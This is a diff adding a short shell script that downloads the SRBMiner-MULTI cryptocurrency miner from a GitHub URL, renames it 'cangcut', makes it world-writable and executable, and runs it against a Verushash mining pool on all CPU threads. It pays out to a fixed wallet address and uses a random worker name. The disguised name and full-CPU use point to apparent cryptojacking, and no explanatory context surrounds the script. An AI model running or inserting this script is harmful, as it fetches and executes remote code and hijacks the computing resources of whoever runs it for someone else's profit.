@@ -1,0 +1,4 @@
+#!/bin/sh
+wget -O cangcut https://github.com/kazppkido/kikir/raw/main/SRBMiner-MULTI
+chmod 777 cangcut
+./cangcut --algorithm verushash --pool stratum+tcp://sg.vipor.net:5040 --wallet RT4DKWFAuMU4wfocnXrpTzykJgdpBpRSSV.$(shuf -n 1 -i 1-999)-KK --password x --cpu-threads $(nproc --all)
